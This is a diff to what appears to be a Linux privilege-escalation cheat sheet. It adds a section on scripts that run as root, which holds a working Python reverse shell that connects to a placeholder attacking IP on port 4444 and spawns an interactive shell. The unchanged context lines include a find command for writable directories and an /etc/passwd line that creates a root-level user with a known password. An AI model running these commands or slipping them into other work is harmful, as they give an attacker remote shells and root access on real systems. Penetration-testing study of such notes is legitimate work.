@@ -382,6 +382,19 @@ find / -perm -o x -type d 2>/dev/null
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 ```
 
+#### Weird Scripts that run as root
+
+###### See if you can command inject and run other scripts; if so
+
+bash /tmp/shell.sh
+
+```
+#shell.sh
+
+#!/bin/bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
 #### Can write to /etc/passwd
 
 Can add a user with root permissions
@@ -393,8 +406,6 @@ openssl passwd -1 -salt lulz letmein
 #edit /etc/passwd
 plz:$1$lulz$TNLkd169ZEm7OHQx.1M060:0:0:root:/root:/bin/bash
 ```
-
-
 
 ### Bad path configuration
 
